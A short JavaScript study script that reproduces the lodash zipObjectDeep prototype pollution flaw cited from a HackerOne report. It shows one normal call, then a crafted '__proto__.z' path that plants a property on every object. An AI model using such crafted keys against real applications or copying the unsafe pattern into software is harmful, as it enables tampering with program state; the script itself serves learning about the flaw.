/*
 * Found as #1 in:
 * https://www.mend.io/resources/blog/top-security-open-source-vulnerabilities-2020/#1_Lodash
 * 
 * Followed link to Hackerone report:
 * https://hackerone.com/reports/712065
 * 
 * Modified that code, will step through w/debugger
 */
const _ = require('lodash');
var value_good = _.zipObjectDeep(['a.b[0].c', 'a.b[1].d'], [1, 2]);
console.log(JSON.stringify(value_good));

// This is bad, because EVERY object now has the 'z' value!
var value_bad = _.zipObjectDeep(['__proto__.z'],[123]);
console.log("oh no! z = " + z);
console.log("oh no! {}.z = " + {}.z);
console.log("oh no! Object.z = " + Object.z);
